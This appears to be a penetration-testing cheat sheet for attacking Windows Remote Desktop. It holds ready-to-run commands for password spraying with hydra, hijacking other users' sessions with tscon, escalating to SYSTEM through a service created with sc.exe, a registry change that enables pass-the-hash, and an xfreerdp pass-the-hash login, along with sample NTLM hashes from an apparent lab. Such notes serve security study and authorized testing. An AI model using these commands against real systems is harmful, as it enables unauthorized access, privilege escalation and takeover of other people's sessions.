# RDP

Guessing a password with password spraying (a single password and a list of users)

```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## RDP Session Hijacking

We can get a list of the currently logged in users using (sessions)

```
query user
```

If we have system privileges we can hijack the other guys session

```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local admin we can obtain SYSTEM by creating a service with `sc`

```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack --> start the service

Note: This method no longer works on Server 2019.
```

When we only have the hash we need to change a reg key

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Then with xfreerdp we can pass the hash:
```
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.

User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824

